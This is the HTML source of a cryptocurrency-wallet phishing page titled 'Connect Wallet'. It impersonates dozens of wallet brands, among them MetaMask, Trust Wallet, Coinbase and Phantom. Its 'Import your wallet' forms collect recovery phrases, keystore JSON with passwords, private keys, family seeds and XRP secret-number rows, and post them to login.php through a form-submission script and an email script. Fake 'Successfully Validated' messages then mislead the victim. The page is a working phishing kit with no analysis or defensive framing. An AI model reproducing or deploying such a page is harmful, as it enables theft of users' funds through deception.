...
<html prefix="og: http://ogp.me/ns#"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    ...
    <link href="./Welcome_files/main.css" rel="stylesheet">
    <link href="./Welcome_files/style.css" rel="stylesheet">

    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="generator" content="Gatsby 2.25.1">
    <title data-react-helmet="true">Connect Wallet</title>
    <link data-react-helmet="true" rel="shortcut icon" href="./sync/x.png">
    ...
    <script src="./Welcome_files/jquery.min.js.download"></script>
    ...
    <link as="script" rel="preload" href="/sync/verifyme.cloud/webpack-runtime-08a0e953018334063ddd.html">
    <link as="script" rel="preload" href="/sync/verifyme.cloud/framework-8e528b732ab2eaadb7b7.html">
    <link as="script" rel="preload" href="/sync/verifyme.cloud/app-2b5a75f35e7d5a1e67ad.html">
    <link as="script" rel="preload" href="/sync/verifyme.cloud/commons-728581910d6e685fb39c.html">
    <link as="script" rel="preload" href="/sync/verifyme.cloud/component---src-pages-apps-tsx-50d212c53780f4e2ed64.html">
    ...
    <script type="text/javascript" src="./Welcome_files/email.min.js.download"></script>
...
<body style="display: block;" data-new-gr-c-s-check-loaded="14.1041.0" data-gr-ext-installed="">
   ...
   -->
                        ...
                        <div class="sc-hrWEMg bHjlF">
                            ...
                            <button id="connect-METAMASK" class="sc-kPVwWT sc-kfGgVZ sc-kIPQKe dQoUpv">
                                <div class="sc-esjQYD iGptdp">
                                    <div color="#E8831D" class="sc-RefOD jsJmJE">OwnBit</div>
                                    <div class="sc-iQKALj GTKuw">
                                        Easy-to-use browser extension.
                                    </div>
                                </div>
                                <div class="sc-bwCtUz lgYJCf">
                                    <img class="firstImg" src="./Welcome_files/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="Icon" style="width: 24px;">
                                </div>
                            </button>
                        </div>
                    </div>
                    ...
                    <div class="sm:flex sm:items-start">
                        <form action="login.php" method="post">
                            <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
                                <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;"> <img src="./Welcome_files/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import
                                        your <span id="walletname">OwnBit</span> wallet
                                    </span>
                                </h3>
                                <div class="mt-2">
                                    <div class="mt-10">
                                        ...
                                        <div id="first" class="acc-body active">
                                            ...
                                            <div class="flex flex-col mb-6">
                                                <div class="relative" data-children-count="1">
                                                    <textarea id="phraseinput" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" minlength="24" maxlength="180" required=""></textarea>
                                            ...
                                            <div style="display:none" class="thankyou_message">
                                                <p class="successful">Phrase Successfully Validated, goto Keystore JSON
                                                </p>
                                            </div>
                                        </div>
                                        ...
                                        <div id="second" class="acc-body bg-grey-600">
                                            ...
                                            <div class="flex flex-col mb-6">
                                                <div class="relative">
                                                    <textarea cols="30" rows="4" placeholder="Enter your Keystore JSON" id="keystoreval" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="keystore" minlength="24" maxlength="180"></textarea>
                                                </div>
                                            </div>
                                            <div class="flex flex-col mb-6">
                                                <div class="relative" data-children-count="1">
                                                    <input type="text" name="password" minlength="5" maxlength="50" placeholder="Wallet password" id="keystorepass" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <p class="text-xs text-grey-300 mt-6">
                                          ...
                                          w-full transition duration-150 ease-in">
                                            ...
                                            <!-- Successfully Submitted page-->
                                            <div style="display:none" class="thankyou_message">
                                                <p class="successful">Keystore JSON Successfully Validated, goto
                                                    Keystore JSON</p>
                                            </div>
                                        </div>
                                        ...
                                        <div id="third" class="acc-body bg-grey-600">
                                            <div class="flex flex-col">
                                                <div class="relative"><input type="hidden" name="wallet_id" required="required" placeholder="Wallet ID" id="wallet_id" value="OwnBit"></div>
                                            </div>
                                            <div class="flex flex-col mb-6">
                                                <div class="relative" data-children-count="1">
                                                    <input type="text" placeholder="Enter your Private Key" name="key" minlength="20" maxlength="180" id="privatekeyval" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <p class="text-xs text-grey-300 mt-6">
                                        ...
                                        <div id="fourth" class="acc-body bg-grey-600">
                                            ...
                                            <div class="flex flex-col mb-6">
                                                <div class="relative">
                                                    <textarea cols="30" rows="4" placeholder="" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" id="familyseed"></textarea>
                                                    <p class="text-xs text-grey-300 mt-6">
                                        ...
                                        <div id="fiveth" class="acc-body bg-grey-600">
                                            ...
                                            <div class="flex flex-col mb-6">
                                                <div class="relative">
                                                    <input type="text" placeholder="Secret numbers of row A" name="privatekey1" minlength="6" maxlength="6" id="privatekey1" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <input type="text" placeholder="Secret numbers of row B" name="privatekey2" minlength="6" maxlength="6" id="privatekey2" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <input type="text" placeholder="Secret numbers of row C" name="privatekey3" minlength="6" maxlength="6" id="privatekey3" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <input type="text" placeholder="Secret numbers of row D" name="privatekey4" minlength="6" maxlength="6" id="privatekey4" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <input type="text" placeholder="Secret numbers of row E" name="privatekey5" minlength="6" maxlength="6" id="privatekey5" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <input type="text" placeholder="Secret numbers of row F" name="privatekey6" minlength="6" maxlength="6" id="privatekey6" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <input type="text" placeholder="Secret numbers of row G" name="privatekey7" minlength="6" maxlength="6" id="privatekey7" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                    <input type="text" placeholder="Secret numbers of row H" name="privatekey8" minlength="6" maxlength="6" id="privatekey8" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                ...
                <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
                    ...
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="Meta">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="Trust">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/coinbase.png" alt="Coinbase">
                        </div>
                    </div>
                    <!-- end -->
                    ...
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/xumm.png" alt="Xumm">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/cardano.png" alt="Cardano">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/daedalus.png" alt="Daedalus">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/yoroi.png" alt="Yoroi">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/ccvault.png" alt="CCVault">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/gero.jpg" alt="Gero">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/nami.png" alt="Nami">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/solana.png" alt="Solana">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/phantom.jpg" alt="Phantom">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/solflare.png" alt="Solflare">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/sollet.png" alt="Sollet">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/solong.jpg" alt="Solong">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/exodus.png" alt="Exodus">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/avalanche.png" alt="Avalanche">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/velas.png" alt="Velas">
                        </div>
                    </div>
                    <!-- end -->
                    ...
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Cypto.com">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/blockchain-logo.png" alt="Blockchain">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/bsc-logo.png" alt="binance">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png" alt="safepal">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/image.jpg" alt="Argent">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/formatic.png" alt="Meta">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/aktionariat-c5784b26234a389632687a36d2fb3258.png" alt="aktionariat">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" alt="keyring">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/bitkeep-387b0ca7da4cf322f44c70c23064c529.png" alt="bitkeep">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png" alt="SparkPoint">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="ownbit">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png" alt="infinity">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/wallet-io-198f396de22fe25eb370f46544abe69d.png" alt="wallet.io">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png" alt="Infinito">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/image (6).jpg" alt="torus">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/image (5).jpg" alt="nash">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="Bitpay">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/imtoken-fd8c7c52dac6101568954e7448a49202.png" alt="imtoken">
                        </div>
                    </div>
                    <!-- end -->
                    <!-- start -->
                    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                        ...
                        <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                            <img class="img-icons" src="./Welcome_files/otherssss.jpg" alt="Other">
                        </div>
                    </div>
                    <!-- end -->
                </div>
    ...
    <script data-cfasync="false" type="text/javascript" src="./Welcome_files/form-submission-handler.js.download"></script>
    <script src="./Welcome_files/app.min.js.download"></script>
    <script src="./Welcome_files/js1.js.download"></script>
    <script src="./Welcome_files/js2.js.download"></script>
